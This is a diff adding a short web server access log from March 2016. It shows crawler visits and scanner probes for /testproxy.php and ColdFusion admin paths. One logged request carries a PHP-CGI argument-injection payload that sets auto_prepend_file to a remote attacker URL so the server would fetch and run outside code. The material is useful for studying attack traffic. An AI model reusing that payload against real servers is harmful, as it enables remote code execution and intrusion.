@@ -1,0 +1,10 @@
+185.103.252.25 - - [13/Mar/2016:02:20:52 +0000] "HEAD / HTTP/1.1" 200 -
+66.249.74.27 - - [13/Mar/2016:05:48:54 +0000] "GET /robots.txt HTTP/1.1" 404 971
+66.249.74.33 - - [13/Mar/2016:05:48:55 +0000] "GET / HTTP/1.1" 200 11197
+178.216.200.48 - - [13/Mar/2016:07:10:16 +0000] "GET /testproxy.php HTTP/1.1" 404 977
+94.185.83.100 - - [13/Mar/2016:10:55:52 +0000] "GET /testproxy.php HTTP/1.1" 404 977
+195.154.157.114 - - [13/Mar/2016:11:39:12 +0000] "GET /CFIDE/administrator/ HTTP/1.1" 404 991
+137.226.113.7 - - [13/Mar/2016:11:58:57 +0000] "GET / HTTP/1.1" 200 11197
+89.248.160.132 - - [13/Mar/2016:14:18:13 +0000] "GET /cgi-bin/php5?-d+allow_url_include%3Don+-d+safe_mode%3Doff+-d+suhosin.simulation%3Don+-d+max_execution_time%3D0+-d+disable_functions%3D+-d+open_basedir%3Dnone+-d+auto_prepend_file%3Dhttp://hecks.ddosdev.net/ok.txt+-d+cgi.force_redirect%3D0+-d+cgi.redirect_status_env%3D0+-n HTTP/1.1" 404 975
+184.105.247.195 - - [13/Mar/2016:14:31:53 +0000] "GET / HTTP/1.1" 200 11197
+185.25.148.240 - - [13/Mar/2016:19:04:23 +0000] "GET /testproxy.php HTTP/1.1" 404 977
